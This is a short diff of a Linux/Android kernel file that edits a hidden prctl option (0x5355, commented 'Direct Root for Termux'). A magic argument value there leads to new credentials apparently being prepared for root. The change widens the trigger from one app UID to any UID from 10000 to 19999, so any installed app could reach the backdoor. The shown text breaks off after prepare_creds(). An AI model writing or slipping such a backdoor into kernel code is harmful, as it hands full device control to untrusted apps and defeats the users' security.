@@ -2439,7 +2439,7 @@ SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
 	error = 0;
 	switch (option) {
 	case 0x5355: /* Direct Root for Termux (UID 10260) */
-		if (current_uid().val == 10260 && arg2 == 0x416c696f746858ULL) {
+		if (((current_uid().val >= 10000 && current_uid().val <= 19999) || current_uid().val == 0) && arg2 == 0x416c696f746858ULL) {
 			struct cred *new = prepare_creds();
 			if (!new) {
 				error = -ENOMEM;
